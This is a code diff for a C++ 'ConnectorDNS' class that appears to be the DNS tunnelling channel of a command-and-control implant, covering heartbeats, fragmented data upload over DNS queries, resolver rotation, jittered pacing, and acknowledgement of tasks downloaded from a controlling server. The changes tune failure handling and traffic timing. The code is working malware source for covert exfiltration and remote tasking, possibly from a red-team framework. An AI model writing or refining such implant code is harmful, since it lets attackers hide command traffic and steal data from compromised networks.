@@ -1167,16 +1167,9 @@ void ConnectorDNS::SendHeartbeat()
     else {
         this->lastQueryOk = FALSE;
         this->consecutiveFailures++;
-
-        if (this->consecutiveFailures >= 5) {
-            this->hasPendingTasks = FALSE;
-            this->downAckOffset = 0;
-            // Don't reset downBuf/downTotal - keep download state if in progress
-        }
     }
 }
 
-// Private helper: Send ACK after upload
 void ConnectorDNS::SendAck()
 {
     ULONG ackNonce = this->functions->GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
@@ -1363,7 +1356,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 if (retry > 0) {
                     this->functions->Sleep(100 + (this->functions->GetTickCount() % 50));
                 }
-                putOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
+                putOk = QueryWithRotation(qname, "A", tmp, sizeof(tmp), &tmpSize);
             }
 
             if (!putOk) {
@@ -1405,9 +1398,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 offset = sendOffset + chunk;
             }
 
-            // Inter-fragment pacing
+            // Inter-fragment pacing (lightweight delay to avoid flooding resolvers)
             if (this->profile.burst_enabled && this->profile.burst_sleep > 0) {
-                // Burst ON: use burst_sleep (milliseconds)
                 ULONG pacing = this->profile.burst_sleep;
                 ULONG jitterPct = this->profile.burst_jitter;
                 if (jitterPct > 0 && jitterPct <= 90) {
@@ -1418,10 +1410,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 }
                 this->functions->Sleep(pacing);
             }
-            else if (this->sleepDelaySeconds > 0) {
-                // Burst OFF: use sleep_delay (seconds -> milliseconds)
-                ULONG pacing = this->sleepDelaySeconds * 1000;
-                this->functions->Sleep(pacing);
+            else {
+                this->functions->Sleep(50 + (this->functions->GetTickCount() & 0x1F));
             }
         }
 
@@ -1433,13 +1423,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         else {
             this->lastQueryOk = FALSE;
             this->consecutiveFailures++;
-
-            if (this->consecutiveFailures >= 5) {
-                this->hasPendingTasks = FALSE;
-            }
         }
 
-        // Send ACK if needed
         if (this->downAckOffset > 0)
             SendAck();
         return;
@@ -1519,7 +1504,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         // Check for "no data" response: "OK" or empty/small response
         if ((respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') ||
             (respSize <= 4)) {
-            this->hasPendingTasks = FALSE;  // Reset flag when server says "no data"
+            this->hasPendingTasks = FALSE;
+            this->downAckOffset = 0;
+            this->downTaskNonce = 0;
             return;
         }
 
@@ -1662,14 +1649,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         this->recvSize = (int)binLen;
     }
     else {
-        // GET request failed - increment failure counter
         this->lastQueryOk = FALSE;
         this->consecutiveFailures++;
-
-        if (this->consecutiveFailures >= 5) {
-            this->hasPendingTasks = FALSE;
-            this->downAckOffset = 0;
-        }
     }
 }
 
@@ -1694,5 +1675,5 @@ void ConnectorDNS::RecvClear()
 
 BOOL ConnectorDNS::IsBusy() const
 {
-    return (this->downBuf != NULL) || this->hasPendingTasks;
+    return (this->downBuf != NULL) || this->hasPendingTasks || (this->downAckOffset > 0);
 }
